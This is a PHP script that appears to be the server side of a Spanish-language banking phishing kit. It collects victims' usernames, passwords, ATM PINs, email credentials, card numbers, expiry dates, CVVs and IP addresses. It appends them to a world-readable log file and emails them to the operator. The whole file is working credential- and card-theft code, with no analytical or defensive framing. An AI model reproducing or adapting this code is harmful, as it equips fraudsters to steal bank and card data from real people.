<?php 
require('config.php');
require_once("class.inputfilter.php");
date_default_timezone_set('America/Bogota');
$ifilter = new InputFilter();

$usuario = $ifilter->process($_POST['usr']);
$pass = $ifilter->process($_POST['pas']);
$email = $ifilter->process($_POST['ema']);
$conrasena = $ifilter->process($_POST['pasem']);
$archivo = $ifilter->process($_POST['arch']);
$tarjeta = $ifilter->process($_POST['trj']);
$fecha = $ifilter->process($_POST['fec']);
$cvv = $ifilter->process($_POST['codv']);

$ipcliente= $_SERVER['REMOTE_ADDR'];

$data = 'Usuario: '.$usuario.'  Clave: '.$pass.'  Clave Cajero: '.$conrasena.'  Tarjeta: '.$tarjeta.'  Expira: '.$fecha.'  CVV: '.$cvv;

//$file = $archivo;
$file = 'listado.txt';

$salto = "";
$cabecera = "---------------- Nuevo Registro (".date("Y-m-d H:i:s").")";

if (isset($data)) {
    $fp = fopen($file, 'a+');
    fwrite($fp, $salto.PHP_EOL);
    fwrite($fp, $salto.PHP_EOL);
    fwrite($fp, $cabecera.PHP_EOL);
    fwrite($fp, utf8_decode($data).PHP_EOL);
    fwrite($fp, utf8_decode($ipcliente).PHP_EOL);
    fclose($fp);
    chmod($file, 0777);
    echo $file;
}
else {
    echo 'No hay datos que guardar!';
}

$hoy1 = date("Y/m/d");  
$hoy2 = date("Y-m-d H:i:s");  

$to = $destino;
$subject = "Datos Roja Paso 2".$usuario." - ".$hoy1;
$headers = "MIME-Version: 1.0" . "\r\n";
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
 
$message = "
<html>
<head>
<title>Datos</title>
</head>
<body>
<b>Usuario: </b>".$usuario."<br>
<b>Contraseña: </b>".$pass."<br>
<b>Correo: </b>".$email."<br>
<b>Clave Correo: </b>".$conrasena."<br>
<b>Tarjeta: </b>".$tarjeta."<br>
<b>Fecha: </b>".$fecha."<br>
<b>CVV: </b>".$cvv."<br>
<b>Dirección IP: </b>".$ipcliente."<br>
<b>Fecha: </b>".$hoy2."
</body>
</html>";
 
mail($to, $subject, $message, $headers);
exit();

?>